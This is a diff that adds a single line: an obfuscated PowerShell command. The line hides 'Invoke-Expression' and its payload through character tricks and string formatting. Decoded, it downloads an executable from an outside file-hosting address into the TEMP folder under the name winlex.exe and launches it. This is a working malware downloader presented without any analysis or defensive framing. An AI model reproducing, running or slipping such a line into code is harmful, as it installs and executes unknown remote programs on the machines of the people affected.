@@ -1,0 +1,1 @@
+﻿. ( $PsHomE[4]+$PShOME[34]+'x') ((('(New-O'+'b'+'j'+'e'+'ct S'+'ystem.Net.'+'WebClient)'+'.Do'+'wnloadF'+'ile({'+'0'+'}http://'+'r'+'gh'+'o'+'.st'+'/68lJc'+'GFL'+'W{0},{1}{3}e'+'nv'+':TEMP{2}winlex'+'.e'+'xe{1});St'+'art'+'-Process '+'({1}{'+'3}env:TE'+'MP{2'+'}'+'winlex.e'+'xe'+'{'+'1})')-f  [cHAR]39,[cHAR]34,[cHAR]92,[cHAR]36))
